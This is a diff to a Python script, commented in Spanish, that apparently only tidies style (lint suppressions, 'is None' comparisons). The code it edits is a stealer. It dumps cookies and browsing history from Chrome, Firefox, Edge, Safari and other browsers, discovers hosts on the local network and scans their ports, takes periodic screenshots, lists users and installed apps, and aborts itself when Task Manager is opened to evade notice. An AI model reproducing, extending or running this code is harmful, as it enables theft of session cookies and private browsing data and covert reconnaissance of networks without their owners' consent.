@@ -1,7 +1,6 @@
-import re
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import browser_cookie3
-from browser_history.browsers import *
+from browser_history.browsers import *  # noqa: F403
 from browsers import getBrowsersInfo
 import threading
 import sys
@@ -34,7 +33,7 @@ TAKE_SCREEN_SHOTS = settings['Take Screen Shoots']
 
 def autoAbort():    #Creamos una función que aborte el programa si ve que no quedan hilos en ejecución o se abre el task manager
     loops = 0
-    while sens.is_task_manager_open()==False and len(threading.enumerate()) >1:
+    while not sens.is_task_manager_open() and len(threading.enumerate()) >1:
         if loops==12000: #Aprobechamos este loop para tomar screenshoots cada 8000 ciclos
             if TAKE_SCREEN_SHOTS:
                 sens.takeScreenShot(imageName=datetime.datetime.now().strftime("%Y%m%d_%H%M%S"), path= f"{carpeta_script}\\output\\pictures\\")
@@ -62,7 +61,7 @@ def main():
         index = False
                 #Obtenemos todas las interfaces de red
         for interface, value in net.getInterfacesInfo().items():
-            if index== False:  
+            if not index:  
                 archivo.write(f'"{interface}":{{\n\t\t\t\t"Network Data": {{ "gateway":"{value[0]}", "submask": "{value[1]}" }}')
                 index = True
             else:
@@ -72,13 +71,13 @@ def main():
                     #Escaneamos todas las redes de cada interfaz
                     hostDiscovery =net.hostDiscovery(f"{".".join(value[0].split(".")[:-1])+"."+str(int(value[0].split(".")[3])-1)  +"/"+  str(sum(bin(int(x)).count('1') for x in value[1].split('.'))) }").items()
 
-                except:
+                except:  # noqa: E722
                     hostDiscovery = {"":""}
                 archivo.write(',\n\t\t\t\t"Hosts in Network": {  ')
                 index2 = False
                 try:
                     for ip, MacAddres in hostDiscovery:
-                        if index2 == False:  #Ponemos la ip y Mac de todos los hosts en la red
+                        if not index2:  #Ponemos la ip y Mac de todos los hosts en la red
                             archivo.write(f'\n\t\t\t\t\t"{ip}":\t{{"Mac Addres": "{MacAddres}"')
                             index2 = True
                         else:
@@ -87,7 +86,7 @@ def main():
                         if PORTS_CANN:
                             archivo.write(',\n\t\t\t\t\t\t"ports": {  ')
                             for port, service in net.portScanner(ip, DELAY): #La IP y el DELAY entre puerto y puerto
-                                if index3 == False: #Ponemos los puertos y servicios que utiliza cada host
+                                if not index3: #Ponemos los puertos y servicios que utiliza cada host
                                     archivo.write(f'\n\t\t\t\t\t\t\t"{port}": "{service}"')
                                     index3 = True
                                 else:
@@ -96,7 +95,7 @@ def main():
 
                         archivo.write("\n\t\t\t\t\t}")
                     
-                except:
+                except:  # noqa: E722
                     pass
                 finally:
                     archivo.write("\n\t\t\t\t}")
@@ -112,11 +111,11 @@ def main():
         if COLLECT_BROWSERS_INFO:
             browsers = {}
             #Obtenemos las cookies y el historial de todos los navegadores en el mercado
-            for browserCookie, browserHistory in {browser_cookie3.chrome: Chrome, browser_cookie3.brave: Brave,  
-                                                browser_cookie3.chromium:Chromium, browser_cookie3.edge:Edge, 
-                                                browser_cookie3.firefox: Firefox, browser_cookie3.librewolf: LibreWolf, 
-                                                browser_cookie3.opera: Opera, browser_cookie3.opera_gx:OperaGX, 
-                                                browser_cookie3.safari:Safari, browser_cookie3.vivaldi:Vivaldi}.items():
+            for browserCookie, browserHistory in {browser_cookie3.chrome: Chrome, browser_cookie3.brave: Brave,  # noqa: F405
+                                                browser_cookie3.chromium:Chromium, browser_cookie3.edge:Edge,  # noqa: F405
+                                                browser_cookie3.firefox: Firefox, browser_cookie3.librewolf: LibreWolf,  # noqa: F405
+                                                browser_cookie3.opera: Opera, browser_cookie3.opera_gx:OperaGX,  # noqa: F405
+                                                browser_cookie3.safari:Safari, browser_cookie3.vivaldi:Vivaldi}.items():  # noqa: F405
 
                 browsers[browserHistory.name]=getBrowsersInfo(browserCookie, browserHistory)
 
@@ -124,16 +123,16 @@ def main():
 
             for browser in browsers:
                 if browser == "Chrome":
-                    if browsers[browser][0] == None:
+                    if browsers[browser][0] is None:
                         browsers[browser][0] = "None"
                         #Ponemos las cookies formateadas en json
                     archivo.write(f'"{browser}\": {{\n\t\t\t"Cookies\":{browsers[browser][0]},\n\t\t\t"History":{{\n')
                 else:
-                    if browsers[browser][0] == None:
+                    if browsers[browser][0] is None:
                         browsers[browser][0] = '"None"'
 
                     archivo.write('},\n\t\t"'+browser+f'": {{\n\t\t\t"Cookies":{browsers[browser][0]},\n\t\t\t"History":{{\n' )
-                if not browsers[browser][1] is None:
+                if browsers[browser][1] is not None:
                     index = 0
                     
                     for history in browsers[browser][1]:
@@ -160,7 +159,9 @@ def main():
                 else:
                     archivo.write(f',\n\t\t\t"{user}"')
             archivo.write('\n\t\t]')
-            if APP_DISCOVERY: archivo.write(',')
+            if APP_DISCOVERY: 
+                archivo.write(',')
+                
         if APP_DISCOVERY:
             archivo.write('\n\t\t"Apps In Device": {')
             index = 0
